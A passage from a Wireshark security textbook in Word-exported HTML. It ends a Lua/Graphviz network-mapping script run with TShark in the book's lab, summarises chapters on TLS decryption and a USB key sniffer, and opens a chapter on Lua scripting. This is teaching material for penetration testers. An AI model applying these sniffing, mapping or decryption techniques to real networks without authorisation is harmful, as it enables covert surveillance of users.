class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >.. streaminfo["pdst"])</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:4.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section314" ><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:114.0000pt;margin-left:151.9000pt;text-indent:-28.8000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if streaminfo["istcp"] then gv.setv(tmp_e, "color", "red")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >else</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:151.9000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><a name="_bookmark593" ></a><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >gv.setv(tmp_e, "color", "green")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:123.1000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--gv.setv(G, "concentrate", "true")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >gv.setv(G, "overlap", "scale")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:179.8500pt;margin-left:94.3000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >gv.setv(G, "splines", "true") gv.layout(G, "neato") gv.render(G, "svg")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:280.6000pt;margin-left:65.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--end of tap.draw() end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:273.4000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--end of init_listener() end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- call the init_listener function init_listener()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:338.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--end of everything end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To run the script, run the following command, which generates an SVG file and saves it as </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >w4sp_graph.svg</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Notice that we are sniffing on the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >w4sp_lab </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >interface. This script can also run against a packet capture by using the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-r</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.9000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >switch.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.9000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >w4sp@w4sp-kali:~$ w4sp_tshark -q -X lua_script:wireviz.lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:266.2000pt;margin-left:8.0000pt;text-indent:7.1500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-i w4sp_lab &#62; w4sp_graph.svg Capturing on 'w4sp_lab'</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >^C143 packets captured</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Once the SVG file is open, you can view it in Iceweasel by running the following command:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.1000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >w4sp@w4sp-kali:~$ iceweasel w4sp_graph.svg</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section315" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You should see something like in<a name="_bookmark594" ></a>&nbsp;</span><span><a href="#_bookmark595" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-18</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="780"  height="623"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker389419.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark595" ></a><span><a href="#_bookmark594" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-18:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >TShark-generated network graph</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:27.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Having a network graph can be valuable in a few scenarios. Like we hinted at in the section&#8217;s introduction, you might be a penetration tester at an unfamiliar network. With this Lua script, you can gain a high-level overview of the network traffic. Regardless of whether or not the customer provides you a network diagram, your diagram is based on actual traffic, not how the customer believes the traffic is.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><a name="_bookmark596" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Similarly, you might have the scenario where you&#8217;re expecting a certain connection between two systems but your Lua-generated network graph fails to show that connection. While this isn&#8217;t a &#8220;smoking gun&#8221; for a problem, it does illustrate a discrepancy that might need further investigation.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section316" ><h2 style="margin-top:3.7000pt;" ><a name="Summary" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark597" ></a>Summary</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:8.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This chapter covered a wide range of topics. We went through how you can use Wireshark to decrypt SSL/TLS-encrypted traffic. The first method of decryption utilized the TLS server&#8217;s private key and can only be utilized if the Diffie-Helman key exchange is not used. In the case of more robust cipher suites that utilize Diffie-Helman, we</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >walked through how to get the session keys needed for decryption from your browser by setting the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SSLKEYLOGFILE </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >environment variable, and then feeding the resulting file to</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5000pt;margin-right:18.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >After decryption, we quickly changed tracks and moved into how you can capture USB traffic from both Windows and Linux operating systems using <a name="_bookmark598" ></a>Wireshark. With a solid understanding of how to capture USB packets, we weaponized that functionality to build a TShark-based key sniffer.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Finally, we covered how to import the Graphviz Lua graphing library to help you visualize the network. Using the Graphviz library, we created an SVG file that contains all the network hosts, as well as the corresponding connections. This allows you to quickly get an idea of the network topology without injecting any packets from your system.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="Exercises" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark599" ></a>Exercises</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=17  style="margin-top:9.8500pt;margin-right:16.6000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l22 level1 lfo21;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Try decrypting SSL/TLS traffic on your home browser. Even</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >when provided the key, can you decrypt? Why or why not? (Hint: DH exchange.)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.5500pt;margin-right:13.6500pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;line-height:17.3000pt;mso-line-height-rule:exactly;mso-list:l22 level1 lfo21;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Suppose you find a legacy Linux system with kernel 2.6.7. What is the extra step for capturing USB traffic on a pre-2.6.23 kernel?</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >See</span><span><a href="https://wiki.wireshark.org/CaptureSetup/USB#Linux" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >https://wiki.wireshark.org/CaptureSetup/USB#Linux</span></u></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.4000pt;margin-right:22.4000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l22 level1 lfo21;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Try graphing the network in different W4SP Lab scenarios&#8212;for example, with the MitM or the IPS buttons enabled. Compare</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the different nodes that come up (or</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.4000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >don&#8217;t).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section317" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p><h1 style="margin-right:257.8000pt;" ><a name="Chapter 8: Scripting with Lua" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><a name="_bookmark600" ></a><a name="_bookmark601" ></a>Chapter 8 Scripting with Lua</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoBodyText  style="margin-top:15.3500pt;margin-right:11.1500pt;" ><a name="_bookmark602" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Welcome to the final chapter. Prior to this point, working with Wireshark routinely meant using the graphical interface, and just the occasional mention of its command-line interface, TShark. We briefly introduced TShark in </span><span><a href="#_bookmark237" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 4</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, &#8220;Capturing Packets,&#8221; but in this chapter we really expand our command line usage considerably.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The reason we leverage the command line so much is to employ scripting. This chapter is centered around a scripting language, Lua, which you will find uncovers a lot more potential in Wireshark. Lua allows you to perform tasks specific to capturing or analyzing packets, and to extend Wireshark, both at the command line and in the GUI.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We start with some basics about Lua to demonstrate simple functionality. We then get into writing our own dissector. (Remember those from </span><span><a href="#_bookmark237" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 4</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >?) Finally, to really show off how Lua can extend Wireshark, we write more complex scripts concerning analysis and capture.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:9.4500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The scripts are printed in the book for your reference. All script source is available online, so don&#8217;t feel the need to manually type it. All the Lua scripts are available from the W4SP Lab GitHub repository, at </span><span><a href="https://github.com/w4sp-book/w4sp-lab/" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >https://github.com/w4sp-book/w4sp-lab/</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark603" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Why Lua?" ></a>Why Lua?</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><a name="_bookmark604" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Many software packages seem to support plug-ins of some sort, and with good reason. Tool developers can&#8217;t always build functionality for every situation. Extensibility is what separates the tools you use often for a variety of reasons and those that you use only once in a while.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" 